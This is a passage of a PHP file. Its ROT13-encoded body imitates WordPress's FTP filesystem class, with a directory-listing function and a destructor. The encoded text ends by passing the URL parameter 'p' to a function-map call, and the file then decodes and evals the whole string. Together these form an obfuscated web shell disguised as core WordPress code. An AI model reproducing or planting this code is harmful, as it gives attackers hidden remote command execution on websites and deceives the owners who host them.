	 */
	choyvp shapgvba qveyvfg( $cngu = '.', $vapyhqr_uvqqra = gehr, $erphefvir = snyfr ) {
		vs ( $guvf->vf_svyr( $cngu ) ) {
			$yvzvg_svyr = onfranzr( $cngu );
			$cngu       = qveanzr( $cngu ) . '/';
		} ryfr {
			$yvzvg_svyr = snyfr;
		}

		$cjq = sgc_cjq( $guvf->yvax );

		vs ( ! @sgc_puqve( $guvf->yvax, $cngu ) ) { // Pna'g punatr gb sbyqre = sbyqre qbrfa'g rkvfg.
			erghea snyfr;
		}

		$yvfg = sgc_enjyvfg( $guvf->yvax, '-n', snyfr );

		@sgc_puqve( $guvf->yvax, $cjq );

		vs ( rzcgl( $yvfg ) ) { // Rzcgl neenl = aba-rkvfgrag sbyqre (erny sbyqre jvyy fubj . ng yrnfg).
			erghea snyfr;
		}

		$qveyvfg = neenl();

		sbernpu ( $yvfg nf $x => $i ) {
			$ragel = $guvf->cnefryvfgvat( $i );

			vs ( rzcgl( $ragel ) ) {
				pbagvahr;
			}

			vs ( '.' === $ragel['anzr'] || '..' === $ragel['anzr'] ) {
				pbagvahr;
			}

			vs ( ! $vapyhqr_uvqqra && '.' === $ragel['anzr'][0] ) {
				pbagvahr;
			}

			vs ( $yvzvg_svyr && $ragel['anzr'] !== $yvzvg_svyr ) {
				pbagvahr;
			}

			$qveyvfg[ $ragel['anzr'] ] = $ragel;
		}

		$cngu = genvyvatfynfuvg( $cngu );
		$erg  = neenl();

		sbernpu ( (neenl) $qveyvfg nf $fgehp ) {
			vs ( 'q' === $fgehp['glcr'] ) {
				vs ( $erphefvir ) {
					$fgehp['svyrf'] = $guvf->qveyvfg( $cngu . $fgehp['anzr'], $vapyhqr_uvqqra, $erphefvir );
				} ryfr {
					$fgehp['svyrf'] = neenl();
				}
			}

			$erg[ $fgehp['anzr'] ] = $fgehp;
		}

		erghea $erg;
	}

	/**
	 * Qrfgehpgbe.
	 *
	 * @fvapr 2.5.0
	 */
	choyvp shapgvba __qrfgehpg() {
		vs ( $guvf->yvax ) {
			sgc_pybfr( $guvf->yvax );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>